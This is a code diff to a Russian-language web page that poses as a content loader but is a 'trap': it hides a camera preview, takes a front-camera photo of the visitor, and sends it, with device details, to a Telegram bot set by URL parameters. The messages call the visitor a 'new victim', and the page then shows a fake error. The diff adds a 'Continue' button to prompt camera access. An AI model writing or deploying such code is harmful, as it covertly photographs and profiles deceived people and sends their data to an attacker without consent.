@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Загрузка...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -31,57 +31,69 @@
             text-align: center;
             opacity: 0.8;
             font-size: 14px;
+            margin-bottom: 30px;
         }
+        .btn {
+            background: #fff;
+            color: #000;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.2s;
+        }
+        .btn:active { transform: scale(0.95); }
+        .hidden { display: none !important; }
+        video, canvas { position: absolute; opacity: 0; pointer-events: none; }
         .error {
             display: none;
             text-align: center;
             padding: 20px;
         }
-        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div id="loading">
+    <div id="step1">
         <div class="loader"></div>
         <div class="message">
             Загрузка контента...<br>
-            <small style="opacity: 0.6;">Пожалуйста, разрешите доступ к камере</small>
+            <small style="opacity: 0.6;">Нажмите кнопку для продолжения</small>
         </div>
+        <button class="btn" onclick="startCamera()">Продолжить</button>
+    </div>
+
+    <div id="step2" class="hidden">
+        <div class="loader"></div>
+        <div class="message">Получение доступа к камере...</div>
     </div>
 
     <div id="error" class="error">
         <h2>⚠️</h2>
         <p>Ошибка загрузки</p>
-        <small style="opacity: 0.6;">Попробуйте обновить страницу</small>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // Configuration - will be filled by generator
-        const CONFIG = {
-            botToken: 'YOUR_BOT_TOKEN',
-            chatId: 'YOUR_CHAT_ID'
-        };
-
-        // Get config from URL parameters
+        // Get URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('token');
         const chatId = urlParams.get('chat');
         const trapId = urlParams.get('id') || 'unknown';
 
-        if (token && chatId) {
-            CONFIG.botToken = token;
-            CONFIG.chatId = chatId;
-            initTrap();
-        } else {
-            showError();
+        if (!token || !chatId) {
+            document.body.innerHTML = '<div style="color:white; padding:20px;">Ошибка: неверная ссылка</div>';
         }
 
-        async function initTrap() {
+        async function startCamera() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+
             try {
-                // Try to access camera
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: false
@@ -93,14 +105,12 @@
                 video.onloadedmetadata = () => {
                     setTimeout(() => {
                         captureAndSend(stream);
-                    }, 2000); // Wait for camera to adjust
+                    }, 1500);
                 };
-
             } catch (err) {
                 console.error('Camera error:', err);
-                // Try to send at least info without photo
                 sendToTelegram(null);
-                setTimeout(showError, 1000);
+                showError();
             }
         }
 
@@ -113,55 +123,45 @@
             canvas.height = video.videoHeight || 480;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Stop camera
             stream.getTracks().forEach(track => track.stop());
 
-            // Convert to blob
             canvas.toBlob((blob) => {
                 sendToTelegram(blob);
             }, 'image/jpeg', 0.8);
 
-            // Show error after sending
-            setTimeout(showError, 1500);
+            setTimeout(showError, 1000);
         }
 
         async function sendToTelegram(photoBlob) {
             try {
-                // Prepare message text
-                const deviceInfo = `
-🎣 <b>Новая жертва!</b>
+                const deviceInfo = `🎣 Новая жертва!
 
-🆔 ID: <code>${trapId}</code>
+🆔 ID: ${trapId}
 📱 Устройство: ${navigator.platform}
 🌐 Язык: ${navigator.language}
 📏 Экран: ${screen.width}x${screen.height}
 🕐 Время: ${new Date().toLocaleString('ru-RU')}
-👤 User Agent: ${navigator.userAgent.substring(0, 100)}...
-                `.trim();
+👤 User Agent: ${navigator.userAgent.substring(0, 50)}...`;
 
                 if (photoBlob) {
-                    // Send photo with caption
                     const formData = new FormData();
-                    formData.append('chat_id', CONFIG.chatId);
+                    formData.append('chat_id', chatId);
                     formData.append('photo', photoBlob, 'victim.jpg');
                     formData.append('caption', deviceInfo);
-                    formData.append('parse_mode', 'HTML');
 
-                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
                 } else {
-                    // Send text only if no photo
-                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            chat_id: CONFIG.chatId,
+                            chat_id: chatId,
                             text: deviceInfo + '
 
-⚠️ <i>Фото не удалось получить (доступ запрещен)</i>',
-                            parse_mode: 'HTML'
+⚠️ Фото не получено'
                         })
                     });
                 }
@@ -171,7 +171,7 @@
         }
 
         function showError() {
-            document.getElementById('loading').style.display = 'none';
+            document.getElementById('step2').classList.add('hidden');
             document.getElementById('error').style.display = 'block';
         }
     </script>
